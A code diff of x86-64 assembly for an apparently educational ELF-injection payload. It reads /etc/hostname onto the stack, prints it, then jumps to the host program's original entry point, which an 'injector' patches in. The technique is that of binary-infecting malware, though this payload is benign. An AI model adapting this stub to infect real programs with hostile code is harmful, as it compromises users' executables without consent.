@@ -12,16 +12,17 @@ _start:
     ; using the file descriptor we can read the file
     mov rdi, rax ; move fd first before setting rax
     xor rax, rax ; sys_read = 0
-    lea rsi, [rel buffer] ; set buffer for reading
-    mov rdx, 32 ; 32 byte buffer
+    sub rsp, 32 ; allocate 32 bytes to the stack
+    mov rsi, rsp ; set the buffer to the stack
+    mov rdx, 32 ; allocated 32 bytes
     syscall ; bytes read will be stored in rax
 
     ; now we can write out the buffer
     mov rdx, rax ; move bytes read first 
     mov rax, 1 ; sys_write = 1
     mov rdi, 1 ; fd for stdout is 1
-    lea rsi, [rel buffer] ; buffer
-    syscall ; 
+    mov rsi, rsp ; buffer is stack again
+    syscall 
 
     ; it would be base (wherever ASLR puts the program) + original e_entry = actual address
     ; this dummy address would be replaced by the injector with the right address
@@ -29,4 +30,3 @@ _start:
     jmp rax
 
 filename: db "/etc/hostname", 0 ; file we want to read that's null terminated
-buffer: times 32 db 0 ; reserve 32 zeroed out bytes for reading
